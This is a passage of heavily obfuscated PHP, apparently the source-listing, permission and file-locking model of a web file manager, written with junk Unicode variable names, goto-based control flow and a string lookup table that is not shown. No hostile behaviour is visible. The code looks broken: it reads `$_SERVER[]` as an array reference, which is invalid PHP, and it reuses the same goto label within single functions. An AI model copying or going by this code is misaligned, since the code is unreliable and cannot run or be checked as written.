($E[$eي[29]] == $eي[409] && $f≢[$E[$eي[76]]]) { $E[$eي[85]] = $f≢[$E[$eي[76]]]; } } unset($E); return $f; goto E; E: } public function listUserTag($f) { goto fېµ; eۻ: if (!$D || count($aߎ) == $D[$Eٌ̓[364]][$Eٌ̓[365]]) { return $D; } $C͈ = array(); $cǵ = array_to_keyvalue($D[$Eٌ̓[75]], $Eٌ̓[33], $Eٌ̓[395]); goto A˽̮; fېµ: $Eٌ̓ =& $_SERVER[]; if ($f && !is_array($f)) { $f = array($f); } $aܯ = Model($Eٌ̓[418])->listData(); goto C; f󓊏: if ($C͈) { Model($Eٌ̓[420])->removeBySource($C͈); } return $D; goto D; Fը: foreach ($B as $b鱅 => $a) { $Cڄ = !0; if (!$f) { $aߎ[] = $b鱅; continue; } foreach ($f as $aȷ) { if (!in_array($aȷ, $a)) { $Cڄ = !1; break; } } if ($Cڄ) { $aߎ[] = $b鱅; } } if (!$aߎ) { return array(); } $D = $this->listSource(array($Eٌ̓[410] => array($Eٌ̓[411], $aߎ))); goto eۻ; C: $B = array(); foreach ($aܯ as $F׮) { $dǟ = $F׮[$Eٌ̓[76]]; if (!$dǟ) { continue; } if (!isset($B[$dǟ])) { $B[$dǟ] = array(); } $B[$dǟ][] = $F׮[$Eٌ̓[419]]; } $aߎ = array(); goto Fը; A˽̮: $EƓ = array_to_keyvalue($D[$Eٌ̓[74]], $Eٌ̓[33], $Eٌ̓[395]); $eŨ = array_merge($EƓ, $cǵ); foreach ($aߎ as $dǟ) { if (!in_array($dǟ, $eŨ)) { $C͈[] = $dǟ; } } goto f󓊏; D: } public function listUserRecycle() { $Aɾ =& $_SERVER[]; $b = Model($Aɾ[421])->listData(); if (!$b) { return array(); } $d׿ = array($Aɾ[410] => array($Aɾ[411], $b), $Aɾ[422] => 1); return $this->listSource($d׿); } public function listSource($dǛ, $d亏 = 3000) { goto DԾ; a: $cڮ = $this->field($F߬)->_makeOrder()->where($dǛ)->selectPage($d亏); $this->_listDataApply($cڮ[$Aƅ[367]]); $this->_listMake($cڮ); goto bʽ; DԾ: $Aƅ =& $_SERVER[]; if (!isset($dǛ[$Aƅ[423]])) { $dǛ[$Aƅ[423]] = 0; } $F߬ = $Aƅ[424]; goto a; bʽ: return $cڮ; goto dټФ; dټФ: } protected function _makeOrder() { goto A弊̰; dŋ: if ($Bٲ == $F⃊[28]) { } $bڧِ = $F⃊[437] . $A[$Bٲ] . $F⃊[50] . $e͗[$f۳]; return $this->order(rtrim(trim($bڧِ), $F⃊[47])); goto eė; E٦: $e͗ = array($F⃊[428] => $F⃊[429], $F⃊[430] => $F⃊[431]); $A = array($F⃊[28] => $F⃊[28], $F⃊[78] => $F⃊[78], $F⃊[168] => $F⃊[405], $F⃊[432] => $F⃊[432], $F⃊[433] => $F⃊[434], $F⃊[194] => $F⃊[194], $F⃊[84] => $F⃊[84]); $Bٲ = Input::get($F⃊[435], $F⃊[7], $bթ, array_keys($A)); goto BԱܑ; A弊̰: $F⃊ =& $_SERVER[]; $bթ = Model($F⃊[425])->get($F⃊[426]); $Eĥ = Model($F⃊[425])->get($F⃊[427]); goto E٦; BԱܑ: $f۳ = Input::get($F⃊[436], $F⃊[7], $Eĥ, array_keys($e͗)); if (!in_array($Bٲ, array_keys($A))) { $Bٲ = $F⃊[28]; } if (!in_array($f۳, array_keys($e͗))) { $Bٲ = $F⃊[428]; } goto dŋ; eė: } protected function _listDataApplyItem($A, $e = false) { $aߙƝ = array($A); $this->_listDataApply($aߙƝ, $e); return $aߙƝ[0]; } protected function _listDataApply(&$CƜ, $Eʌ = false) { goto EۿǍ; aω: $Eٞ = array_unique($Eٞ); $this->_listSourceCache($CƜ); if (!$Eʌ) { $this->_listAppendMeta($CƜ, $Eٞ); $this->_listAppendFileMeta($CƜ, $Eٞ); $this->_listAppendChildren($CƜ, $Eٞ); } goto e⺕; f͍: $this->_listAppendUser($CƜ); $this->_listFilterInfo($CƜ, $Eʌ); $this->_listAppendAuthSecret($CƜ); goto B߉; e⺕: $this->_listAppendPath($CƜ); $this->_listAppendAuth($CƜ); $this->_listAppendSourceInfo($CƜ, $Eٞ); goto f͍; EۿǍ: $A =& $_SERVER[]; if (!$CƜ) { $CƜ = array(); return; } $Eٞ = array_to_keyvalue($CƜ, $A[33], $A[395]); goto aω; B߉: } protected function _listSourceCache($e) { $Fӎ =& $_SERVER[]; foreach ($e as $C) { self::$cacheSourceInfo[$Fӎ[438] . $C[$Fӎ[395]]] = $C; } } protected function _listFilterInfo(&$b, $Fވ = false) { $a =& $_SERVER[]; foreach ($b as &$F) { $F = $this->pathInfoFilter($F); self::$cachePathInfo[$a[439] . intval($Fވ) . $a[440] . $F[$a[395]]] = $F; } unset($F); } protected function _listMake(&$Bە) { $bڭ =& $_SERVER[]; $Bە[$bڭ[75]] = array(); $Bە[$bڭ[74]] = array(); foreach ($Bە[$bڭ[367]] as $b♌˨) { $B䳼 = $b♌˨[$bڭ[403]] == 1 ? $bڭ[75] : $bڭ[74]; $Bە[$B䳼][] = $b♌˨; } unset($Bە[$bڭ[367]]); } protected function _listAppendMeta(&$Cﰘ, $Fϼӹ) { goto C곇; D䫢: if (!$aƖÇ) { return; } $f҇é = array($F[443], $F[444]); $A = array(); goto fݒ; fݒ: foreach ($aƖÇ as $Eʂ) { if (!isset($A[$Eʂ[$F[395]]])) { $A[$Eʂ[$F[395]]] = array(); } if (in_array($Eʂ[$F[93]], $f҇é)) { continue; } $A[$Eʂ[$F[395]]][$Eʂ[$F[93]]] = $Eʂ[$F[372]]; } foreach ($Cﰘ as &$e) { $e[$F[445]] = !1; if (isset($A[$e[$F[395]]])) { $e[$F[445]] = $A[$e[$F[395]]]; } if ($this->fileIsLock($e) && $e[$F[406]]) { $bﱎ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $e[$F[406]][$F[407]] = AuthModel::authDisable($e[$F[406]][$F[407]], $bﱎ); $e[$F[406]][$F[446]][$F[406]] = $e[$F[406]][$F[407]]; } } unset($e); goto FĎ; C곇: $F =& $_SERVER[]; $e菜 = array($F[410] => array($F[411], $Fϼӹ)); $aƖÇ = Model($F[441])->field($F[442])->where($e菜)->select(); goto D䫢; FĎ: } protected function _listAppendFileMeta(&$a袪ܾ, $BٌɄ) { goto Aޠ; fƩΊ: $f = Model($Aߘ[450])->field($A⯟)->where($F׷愋)->select(); $f = array_to_keyvalue($f, $Aߘ[447]); $aȌ = Model($Aߘ[451])->field($Aߘ[452])->where($F׷愋)->select(); goto bŻν; Aޠ: $Aߘ =& $_SERVER[]; $b = array_to_keyvalue($a袪ܾ, $Aߘ[33], $Aߘ[447]); $b = array_filter(array_unique($b)); goto C; C: if (!$b) { return; } $F׷愋 = array($Aߘ[448] => array($Aߘ[411], $b)); $A⯟ = $Aߘ[449]; goto fƩΊ; C: foreach ($a袪ܾ as &$d޻) { goto fջ; Dʙ: unset($f[$b][$Aߘ[76]]); $E = is_array($fƕ[$b]) ? $fƕ[$b] : array(); $d޻[$Aߘ[164]] = array_merge($E, $f[$b]); goto C; C: if (isset($d޻[$Aߘ[164]][$Aߘ[163]])) { $d޻[$Aߘ[163]] = json_decode($d޻[$Aߘ[164]][$Aߘ[163]], !0); unset($d޻[$Aߘ[164]][$Aߘ[163]]); } goto c˿; Eåշʏ: $bֲ[$Aߘ[78]] = $d޻[$Aߘ[78]]; $bֲ[$Aߘ[28]] = $d޻[$Aߘ[28]]; if (!isset(self::$cacheFileInfo[$Aߘ[453] . $b])) { self::$cacheFileInfo[$Aߘ[453] . $b] = array_merge(array(), $bֲ); } goto Dʙ; fջ: $b = $d޻[$Aߘ[447]]; if (!$b || !is_array($f[$b])) { continue; } $bֲ = $f[$b]; goto Eåշʏ; c˿: } unset($d޻); goto Eǆʚ; bŻν: $aȌ = $aȌ ? $aȌ : array(); $fƕ = array(); foreach ($aȌ as $dꖉ) { if (!isset($fƕ[$dꖉ[$Aߘ[447]]])) { $fƕ[$dꖉ[$Aߘ[447]]] = array(); } $fƕ[$dꖉ[$Aߘ[447]]][$dꖉ[$Aߘ[93]]] = $dꖉ[$Aߘ[372]]; } goto C; Eǆʚ: } protected function _listAppendSourceInfo(&$e, $A斃ނ) { goto eꃫ; f꺘: $d̽в = Model($e[418])->listData(); $a͇ = Model($e[408])->listData(); $bµ = Model($e[456])->listSimple(); goto E; Aۃ: $Bޭҕ = array_to_keyvalue_group($bµ, $e[395]); foreach ($e as &$Eؚ) { $Eؚ[$e[85]] = array($e[457] => 0, $e[458] => 0, $e[459] => 0); if (isset($aǪÏ[$Eؚ[$e[395]]])) { $Eؚ[$e[85]][$e[460]] = 1; $Eؚ[$e[85]][$e[461]] = $aǪÏ[$Eؚ[$e[395]]][$e[28]]; } if (isset($Dԛ퇏[$Eؚ[$e[395]]])) { $Eؚ[$e[85]][$e[462]] = array(); foreach ($Dԛ퇏[$Eؚ[$e[395]]] as $AОТ) { $fЈ = $Aוӂ[$AОТ]; $Eؚ[$e[85]][$e[462]][] = array($e[463] => $fЈ[$e[393]], $e[413] => $fЈ[$e[28]], $e[464] => $fЈ[$e[465]]); } } if (isset($Bޭҕ[$Eؚ[$e[395]]])) { $Eؚ[$e[85]][$e[466]] = array(); foreach ($Bޭҕ[$Eؚ[$e[395]]] as $EӜ) { $Eؚ[$e[85]][$e[466]] = array($e[467] => $EӜ[$e[468]], $e[469] => $EӜ[$e[470]], $e[471] => $EӜ[$e[395]], $e[472] => $EӜ[$e[473]], $e[474] => $EӜ[$e[475]], $e[476] => $EӜ[$e[476]], $e[477] => $EӜ[$e[477]]); } } } unset($Eؚ); goto c; E: $Aוӂ = array_to_keyvalue($D㙉, $e[393]); $Dԛ퇏 = array_to_keyvalue_group($d̽в, $e[76], $e[419]); $aǪÏ = array_to_keyvalue($a͇, $e[76]); goto Aۃ; c: return $e; goto D; eꃫ: $e =& $_SERVER[]; if (!defined($e[454])) { return; } $D㙉 = Model($e[455])->listData(); goto f꺘; D: } protected function _listAppendChildren(&$fܗӄ, $cͺ) { goto Aن; C: unset($eΟ); goto eً; FԼ: $a = array($f[478] => array($f[7], $a)); $f­ = array($f[478], $f[403], $f[479] => $f[480]); $dȈ = $this->field($f­)->where($a)->group($f[481])->select(); goto dϖ; c: foreach ($fܗӄ as &$eΟ) { if (!$eΟ[$f[403]]) { continue; } $a[] = $eΟ[$f[395]]; } unset($eΟ); if (!$a) { return; } goto FԼ; dϖ: $eɋ = array(); foreach ($dȈ as $fɘ) { $Eˈ = $fɘ[$f[478]]; $Eȫ = $fɘ[$f[403]] == $f[87] ? $f[204] : $f[203]; if (!isset($eɋ[$Eˈ])) { $eɋ[$Eˈ] = array($f[203] => 0, $f[204] => 0); } $eɋ[$Eˈ][$Eȫ] += $fɘ[$f[480]]; } foreach ($fܗӄ as &$eΟ) { if (!$eΟ[$f[403]]) { continue; } $f앣 = is_array($eɋ[$eΟ[$f[395]]]) ? $eɋ[$eΟ[$f[395]]] : $FӪ܈; $eΟ[$f[204]] = $f앣[$f[204]]; $eΟ[$f[203]] = $f앣[$f[203]]; unset($eΟ[$f[405]]); } goto C; Aن: $f =& $_SERVER[]; $a = array(); $FӪ܈ = array($f[203] => 0, $f[204] => 0); goto c; eً: } protected function _listAppendAuth(&$Dʓ) { goto A; b薨ͭ: $Ê = Model($D[482])->getSourceList($aƅ, $bԣ); foreach ($Dʓ as $f͘ǝ => &$dߙ) { $dߙ[$D[406]] = $Ê[$dߙ[$D[395]]]; if (!$dߙ[$D[406]] && $dߙ[$D[404]] == self::TYPE_GROUP) { $dߙ[$D[406]] = Action($D[483])->pathGroupAuthMake($dߙ[$D[484]]); if (!$dߙ[$D[406]] && !_get($GLOBALS, $D[485])) { $dߙ[$D[196]] = !1; $dߙ[$D[195]] = !1; } } if ($dߙ[$D[406]]) { $dߙ[$D[196]] = AuthModel::authCheckEdit($dߙ[$D[406]][$D[407]]); $dߙ[$D[195]] = AuthModel::authCheckView($dߙ[$D[406]][$D[407]]); } $this->groupPathDisplay($dߙ); } unset($dߙ); goto a; A: $D =& $_SERVER[]; if (!defined($D[454])) { return; } $aƅ = array(); goto Eʗ; Eʗ: foreach ($Dʓ as $dߙ) { if ($dߙ[$D[404]] == self::TYPE_GROUP) { $aƅ[] = $dߙ[$D[395]]; } } if (!$aƅ) { return; } $bԣ = array_to_keyvalue($Dʓ, $D[395]); goto b薨ͭ; a: } public function _listAppendAuthSecret(&$aאԏ) { goto Bɠ; D: $CǓʻ = $this->_listAppendPath($dݚ, !0); foreach ($aאԏ as $cՌ => &$fњ) { if (!is_array($fњ[$AĐЮ[406]])) { continue; } if ($fњ[$AĐЮ[404]] != $AĐЮ[496]) { continue; } if (isset($cﶕ[$fњ[$AĐЮ[395]]])) { goto E熐; A: if ($fɒҧڡ[$AĐЮ[432]] != $FІ) { $fњ[$AĐЮ[406]][$AĐЮ[407]] = $fњ[$AĐЮ[406]][$AĐЮ[407]] & $fɒҧڡ[$AĐЮ[406]][$AĐЮ[406]]; } continue; goto D檒; E܇䈂: $fњ[$AĐЮ[406]][$AĐЮ[498]] = $fɒҧڡ; $fњ[$AĐЮ[406]][$AĐЮ[499]] = $fњ[$AĐЮ[500]]; $fњ[$AĐЮ[406]][$AĐЮ[501]] = $AĐЮ[87]; goto A; E熐: $fɒҧڡ = $cﶕ[$fњ[$AĐЮ[395]]]; if (!is_array($fњ[$AĐЮ[445]])) { $fњ[$AĐЮ[445]] = array(); } $fњ[$AĐЮ[445]][$AĐЮ[497]] = $fɒҧڡ[$AĐЮ[491]]; goto E܇䈂; D檒: } $c٩ = $this->parentLevelArray($fњ[$AĐЮ[502]]); $fֶ = array_reverse($c٩); foreach ($fֶ as $f => $E柯) { goto Aʪ; Aʪ: if (!isset($cﶕ[$E柯])) { continue; } $fɒҧڡ = $cﶕ[$E柯]; $fњ[$AĐЮ[406]][$AĐЮ[498]] = $fɒҧڡ; goto bτ; FÙ: for ($A = 0; $A < $a³ạ; $A++) { if (!isset($CǓʻ[$c٩[$A]])) { $bܩ߆ = $AĐЮ[33]; break; } $bܩ߆ = $bܩ߆ . rtrim($CǓʻ[$c٩[$A]], $AĐЮ[8]) . $AĐЮ[8]; } $fњ[$AĐЮ[406]][$AĐЮ[499]] = rtrim($bܩ߆, $AĐЮ[8]) . $AĐЮ[8]; break; goto D; bτ: if ($fɒҧڡ[$AĐЮ[432]] != $FІ) { $fњ[$AĐЮ[406]][$AĐЮ[407]] = $fњ[$AĐЮ[406]][$AĐЮ[407]] & $fɒҧڡ[$AĐЮ[406]][$AĐЮ[406]]; } $bܩ߆ = $AĐЮ[33]; $a³ạ = count($c٩) - $f; goto FÙ; D: } } unset($fњ); goto c䂠; bں: if (!$cﶕ) { goto c; fī¯: $cﶕ = array_to_keyvalue($cﶕ, $AĐЮ[395]); $aϿ = json_decode(Model($AĐЮ[486])->get($AĐЮ[490]), !0); $aϿ = array_to_keyvalue($aϿ, $AĐЮ[393]); goto bݤ; c: $A = Model($AĐЮ[488]); $dסɕ = Model($AĐЮ[489]); $cﶕ = $dסɕ->listData(); goto fī¯; bݤ: foreach ($cﶕ as $cՌ => $fњ) { goto cЅ; cЅ: $b = $aϿ[$fњ[$AĐЮ[491]]]; if (!$b) { $dסɕ->remove($fњ[$AĐЮ[393]]); unset($cﶕ[$cՌ]); continue; } $aє蛢 = $A->listData($b[$AĐЮ[406]]); goto Fі; Eݸ: $fњ[$AĐЮ[493]] = Model($AĐЮ[494])->getInfoSimpleOuter($fњ[$AĐЮ[432]]); $cﶕ[$cՌ] = $fњ; goto c; Fі: if (!$aє蛢) { $dסɕ->remove($fњ[$AĐЮ[393]]); unset($cﶕ[$cՌ]); continue; } $fњ[$AĐЮ[406]] = $aє蛢; $fњ[$AĐЮ[492]] = $b; goto Eݸ; c: } goto eѾ; eѾ: } $FІ = defined($AĐЮ[495]) ? USER_ID : $AĐЮ[33]; $dݚ = array(); goto D; Bɠ: $AĐЮ =& $_SERVER[]; if (Model($AĐЮ[486])->get($AĐЮ[487]) != $AĐЮ[87]) { return; } static $cﶕ = false; goto bں; c䂠: } public function groupPathDisplay(&$BѮ) { goto dٹª; c: $BѮ[$a[504]] = $cܪ[$a[478]]; $BѮ[$a[505]] = $cܪ[$a[502]]; $BѮ[$a[506]] = $cܪ[$a[507]]; goto Bˌ; Bˌ: $BѮ[$a[508]] = $EÉƣ . $cܪ[$a[85]][$a[395]]; goto BЉ; dٹª: $a =& $_SERVER[]; if ($BѮ[$a[404]] != self::TYPE_GROUP) { return; } $cܪ = Model($a[503])->getInfo($BѮ[$a[484]]); goto dƷ; dƷ: $F = $this->parentLevelArray($cܪ[$a[502]]); $EÉƣ = $a[33]; foreach ($F as $A) { $aͧ = Model($a[503])->getInfo($A); $EÉƣ .= $aͧ[$a[85]][$a[395]] . $a[47]; } goto c; BЉ: } protected function _listAppendPath(&$FЋ, $b = false) { goto aȈ; EՌ: unset($F); return $FЋ; goto D; fծ: unset($F); $d = array_unique($d); if (count($d) > 0) { $dփ = array($E[410] => array($E[411], $d)); if (count($d) == 1) { $c = $this->sourceInfo($d[0]); $e糆Ԇù = is_array($c) ? array($c) : !1; } else { $e糆Ԇù = $this->field($E[509])->where($dփ)->select(); } if (!$e糆Ԇù) { $e糆Ԇù = array(); } foreach ($e糆Ԇù as $E) { $C㳂[$E[$E[395]]] = $E[$E[28]]; } } goto D; Dö: $A = array(); if ($b) { return $C㳂; } foreach ($FЋ as &$F) { goto dɷ; F: foreach ($fĽ唸 as $B쏉܉ => $E䕧) { if (isset($C㳂[$E䕧])) { continue; } if ($B쏉܉ == 0) { $C㳂[$E䕧] = $this->_listAppendPathRoot($F, $fĽ唸); } if ($B쏉܉ != 0) { $d[] = $E䕧; } } goto F; d粸: if (isset($A[$F[$E[502]]])) { continue; } $A[$F[$E[502]]] = !0; $fĽ唸 = $this->parentLevelArray($F[$E[502]]); goto F; dɷ: $D = $F[$E[395]]; if ($F[$E[403]] == $E[87] && $F[$E[478]] != 0) { $C㳂[$D] = $F[$E[28]]; } if ($F[$E[403]] == $E[87] && $F[$E[478]] == 0 && !isset($C㳂[$D])) { $C㳂[$D] = $this->_listAppendPathRoot($F, array()); } goto d粸; F: } goto fծ; aȈ: $E =& $_SERVER[]; static $C㳂 = array(); $d = array(); goto Dö; D: $Cٝ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Fԭ = array(); foreach ($FЋ as &$F) { goto E; E: $B = $F[$E[502]]; $AܗÑ = $E[33]; if (isset($Fԭ[$B])) { $AܗÑ = $Fԭ[$B]; } else { $fĽ唸 = $this->parentLevelArray($F[$E[502]]); foreach ($fĽ唸 as $B쏉܉ => $E䕧) { if (isset($C㳂[$E䕧])) { $AܗÑ .= $C㳂[$E䕧] . $E[8]; } } $Fԭ[$B] = $AܗÑ; } goto D; Aޑ: if ($F[$E[478]] == $E[191]) { $F[$E[28]] = trim($C㳂[$F[$E[395]]], $E[8]); } if (intval($F[$E[404]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($F, $fĽ唸, $Cٝ); } goto Eȃ; D: $AܗÑ .= $F[$E[28]]; if ($F[$E[403]] == $E[87]) { $AܗÑ .= $E[8]; } $F[$E[500]] = str_replace($E[510], $E[8], $AܗÑ); goto Aޑ; Eȃ: } goto EՌ; D: } private function _listAppendPathRecycle(&$D󸟓, $D, $BΑ) { goto fǄ; E: $BΥ = implode($F͑[8], array_slice($fį, 2)); $D󸟓[$F͑[500]] = $F͑[8] . LNG($F͑[511]) . $F͑[8] . ltrim($BΥ, $F͑[8]); $D󸟓[$F͑[502]] = $F͑[512] . implode($F͑[47], array_slice($D, 1)) . $F͑[47]; goto eˠ; eˠ: if ($D󸟓[$F͑[395]] == $BΑ) { $D󸟓[$F͑[502]] = $F͑[512]; $D󸟓[$F͑[478]] = $F͑[191]; $D󸟓[$F͑[28]] = LNG($F͑[511]); } $D󸟓[$F͑[513]] = $F͑[514]; goto cь; fǄ: $F͑ =& $_SERVER[]; if (!in_array($BΑ, $D) && $D󸟓[$F͑[395]] != $BΑ) { return; } $fį = explode($F͑[8], trim($D󸟓[$F͑[500]], $F͑[8])); goto E; cь: } protected function _listAppendPathRoot(&$D, $BȐ) { $Fȕ =& $_SERVER[]; $b = $Fȕ[33]; if ($D[$Fȕ[404]] == self::TYPE_USER) { if (defined($Fȕ[454]) && $D[$Fȕ[484]] == USER_ID) { $b = LNG($Fȕ[515]); if (!$BȐ) { $D[$Fȕ[28]] = $b; } } else { $B굞 = Model($Fȕ[494])->getInfoSimple($D[$Fȕ[484]]); $b = LNG($Fȕ[516]) . $Fȕ[160] . $B굞[$Fȕ[28]] . $Fȕ[517]; } } else { if ($D[$Fȕ[404]] == self::TYPE_GROUP) { $B굞 = Model($Fȕ[503])->getInfoSimple($D[$Fȕ[484]]); $b = $B굞[$Fȕ[28]]; } else { if ($D[$Fȕ[404]] == self::TYPE_SYSTEM) { $b = $Fȕ[518]; } } } $b = $b ? $Fȕ[8] . $b . $Fȕ[8] : $Fȕ[8]; return $b; } protected function _listAppendUser(&$A·ܩ) { goto a; a: $B =& $_SERVER[]; $a = array_to_keyvalue($A·ܩ, $B[33], $B[432]); $D = array_to_keyvalue($A·ܩ, $B[33], $B[434]); goto e; b: unset($bЅé); goto aⶢ; e: $c΂ = array_merge($a, $D); $E旅 = Model($B[519])->userListInfo($c΂); foreach ($A·ܩ as &$bЅé) { $a = $bЅé[$B[432]]; $bЅé[$B[432]] = $E旅[$a] ? $E旅[$a] : !1; $a = $bЅé[$B[434]]; $bЅé[$B[434]] = $E旅[$a] ? $E旅[$a] : !1; if (isset($bЅé[$B[445]]) && $bЅé[$B[445]][$B[520]]) { $dÉ四 = $GLOBALS[$B[6]][$B[88]][$B[521]]; if ($bЅé[$B[445]][$B[522]] <= time() - $dÉ四) { $this->metaSet($bЅé[$B[395]], $B[520], null); $this->metaSet($bЅé[$B[395]], $B[522], null); unset($bЅé[$B[445]][$B[520]]); continue; } $A܋ڲꙗ = $bЅé[$B[445]][$B[520]]; $bЅé[$B[445]][$B[523]] = Model($B[519])->getInfoSimpleOuter($A܋ڲꙗ); } } goto b; aⶢ: } public function parentLevelArray($C) { $e =& $_SERVER[]; $C = explode($e[47], trim($C, $e[47])); return array_remove_value($C, $e[191]); } public function listAll($eΣ) { goto B; Aǂ: $f젃 = array_to_keyvalue($f젃, $f̂[395]); $cɍ = "\x2f{$eʟ[$f̂[28]]}\x2f"; $cɍ = $cɍ == $f̂[510] ? $f̂[8] : $cɍ; goto c; c: $c޾ = array(); foreach ($f젃 as $Bɨ => $a) { goto eߗ; eߗ: $dџ춉 = $this->parentLevelArray($a[$f̂[502]]); array_shift($dџ춉); $f = $cɍ; goto eړ; E: if (!$a[$f̂[403]]) { $D[$f̂[447]] = $a[$f̂[447]]; $D[$f̂[86]] = $a[$f̂[76]]; } $c޾[] = $D; goto bԙ; aݎ: $f = str_replace($f̂[510], $f̂[8], $f); $f = str_replace($f̂[510], $f̂[8], $f); $D = array($f̂[414] => str_replace($f̂[510], $f̂[8], $f), $f̂[530] => intval($a[$f̂[403]]), $f̂[85] => $this->pathInfoFilter($a)); goto E; eړ: for ($E = 0; $E < count($dџ춉); $E++) { $f .= $f젃[$dџ춉[$E]][$f̂[28]] . $f̂[8]; } $f .= $a[$f̂[28]]; if ($a[$f̂[403]]) { $f .= $f̂[8]; } goto aݎ; bԙ: } return $c޾; goto C؝Ɏ; A䈵: $this->_listAppendAuth($f젃); $this->_listAppendUser($f젃); $this->_listAppendPath($f젃); goto Aǂ; C蓳: $Bۙ = $f̂[528]; $F = "\x4c\105\x46\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\151\x6f\137\x66\151\154\x65\x20\x66\151\x6c\x65\x20\x6f\x6e\x20\163\157\x75\x72\x63\x65\56\x66\x69\x6c\x65\111\104\40\x3d\x20\146\x69\154\x65\x2e\146\151\154\x65\x49\x44"; $f젃 = $this->alias($f̂[529])->field($Bۙ)->where($fų挨)->join($F)->select(); goto A䈵; B: $f̂ =& $_SERVER[]; $eʟ = $this->sourceInfo($eΣ); $fų挨 = array($f̂[524] => array($f̂[525], $eʟ[$f̂[502]] . $eΣ . $f̂[526]), $f̂[527] => 0); goto C蓳; C؝Ɏ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($F᣾) { goto C歨; C歨: $A =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($A[531], $F᣾); goto dӇ; Dφڛ: $this->_lockEvent($F᣾, array($A[534], $A[535]), $F䅸ʴ); $this->_lockCheckEnd($A[531], $F᣾); goto d; dӇ: $F䅸ʴ = 1; $this->_lockEvent($F᣾, array($A[532], $A[533]), $F䅸ʴ); $this->_lockParent($F᣾, array($A[533]), $F䅸ʴ); goto Dφڛ; d: } public function lockCopyEnd($Fã) { $c䑢 =& $_SERVER[]; if (!$this->allowLock()) { return; } $BǽՍ = 0; $this->_lockEvent($Fã, array($c䑢[532], $c䑢[533]), $BǽՍ); $this->_lockParent($Fã, array($c䑢[533]), $BǽՍ); $this->_lockEvent($Fã, array($c䑢[534], $c䑢[535]), $BǽՍ); } public function lockWriteStart($C, $a搵 = '') { goto dߦ; fڭח: $this->_lockParent($C, array($bڲơ[531], $bڲơ[533]), $d); $this->_lockCheckEnd($bڲơ[532], $C); goto E֏; dߦ: $bڲơ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($bڲơ[532], $C); goto F; F: $d = 1; $this->_lockKey($bڲơ[536] . $C . $bڲơ[95] . $a搵, $d); $this->_lockEvent($C, array($bڲơ[531], $bڲơ[533]), $d); goto fڭח; E֏: } public function lockWriteEnd($f퇹, $A = '') { $Fˣ =& $_SERVER[]; if (!$this->allowLock()) { return; } $E晽 = 0; $this->_lockKey($Fˣ[536] . $f퇹 . $Fˣ[95] . $A, $E晽); $this->_lockEvent($f퇹, array($Fˣ[531], $Fˣ[533]), $E晽); $this->_lockParent($f퇹, array($Fˣ[531], $Fˣ[533]), $E晽); } public function lockMoveStart($Cּ) { goto A동; BѾ: $eۘ = 1; $this->_lockKey($Aɬ[537] . $Cּ, $eۘ); $this->_lockEvent($Cּ, array($Aɬ[531], $Aɬ[532]), $eۘ); goto D; D: $this->_lockParent($Cּ, array($Aɬ[531], $Aɬ[533]), $eۘ); $this->_lockEvent($Cּ, array($Aɬ[538], $Aɬ[534], $Aɬ[535]), $eۘ); $this->_lockCheckEnd($Aɬ[533], $Cּ); goto D̪; A동: $Aɬ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($Aɬ[533], $Cּ); goto BѾ; D̪: } public function lockMoveEnd($E޲) { goto cڃ; dԎ: $this->_lockKey($dڄ[537] . $E޲, $Fγ); $this->_lockEvent($E޲, array($dڄ[531], $dڄ[532]), $Fγ); $this->_lockParent($E޲, array($dڄ[531], $dڄ[533]), $Fγ); goto C; cڃ: $dڄ =& $_SERVER[]; if (!$this->allowLock()) { return; } $Fγ = 0; goto dԎ; C: $this->_lockEvent($E޲, array($dڄ[538], $dڄ[534], $dڄ[535]), $Fγ); goto Cť; Cť: } private function _lockCheck($b, $B䂎) { goto aӠ; e㼻: $Bލ = array_reverse($this->parentLevelArray($dҧ[$f㘳ָ[502]])); foreach ($Bލ as $B֊) { $b̹ܶڈ = $b . $f㘳ָ[540] . $B֊; if (CacheLock::lockGet($f㘳ָ[541] . $b̹ܶڈ)) { $dҧ = $this->sourceInfo($B֊); CacheLock::setErrorMsg($f㘳ָ[160] . htmlspecialchars($dҧ[$f㘳ָ[28]]) . $f㘳ָ[517] . $dҞ); $this->_lockKey($b̹ܶڈ, 1); $this->_lockKey($b̹ܶڈ, 0); } } goto Aك; B: $this->_lockTimeStart[$b̹ܶڈ] = timeFloat(); if (!is_array($dҧ)) { return; } $dҞ = LNG($f㘳ָ[539]); goto bﮂ; bﮂ: CacheLock::setErrorMsg($f㘳ָ[160] . htmlspecialchars($dҧ[$f㘳ָ[28]]) . $f㘳ָ[517] . $dҞ); $this->_lockKey($b̹ܶڈ, 1); $this->_lockKey($b̹ܶڈ, 0); goto e㼻; aӠ: $f㘳ָ =& $_SERVER[]; $dҧ = $this->sourceInfo($B䂎); $b̹ܶڈ = $b . $f㘳ָ[95] . $B䂎; goto B; Aك: } private function _lockCheckEnd($B˴, $Cڄ) { goto B˪Բ; B˪Բ: $dۛҎ =& $_SERVER[]; $d = $B˴ . $dۛҎ[95] . $Cڄ; CacheLock::setErrorMsg($dۛҎ[375]); goto AԷ׈; aޛ: if ($D߯ʂ > 0.5) { unset(self::$cacheSourceInfo[$dۛҎ[438] . $Cڄ]); } $A = $this->sourceInfo($Cڄ); if (!$A) { show_json(LNG($dۛҎ[105]), !1); } goto CŪ; AԷ׈: if (!isset($this->_lockTimeStart[$d])) { return; } $D߯ʂ = timeFloat() - $this->_lockTimeStart[$d]; unset($this->_lockTimeStart[$d]); goto aޛ; CŪ: } private function _lockParent($c鐖ބ, $FʟʄŊ, $A) { if (!$this->autoLockSet) { return; } $A = $this->sourceInfo($c鐖ބ); if (!is_array($A)) { return; } $f = array_reverse($this->parentLevelArray($A[$_SERVER[][502]])); foreach ($f as $aؕ) { $this->_lockEvent($aؕ, $FʟʄŊ, $A); } } private function _lockEvent($D, $CƬ, $a͍) { $aֈ =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($CƬ as $b) { $f̔ = $b . $aֈ[95] . $D; if ($a͍ && CacheLock::lockGet($aֈ[541] . $f̔)) { continue; } $this->_lockKey($f̔, $a͍); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function 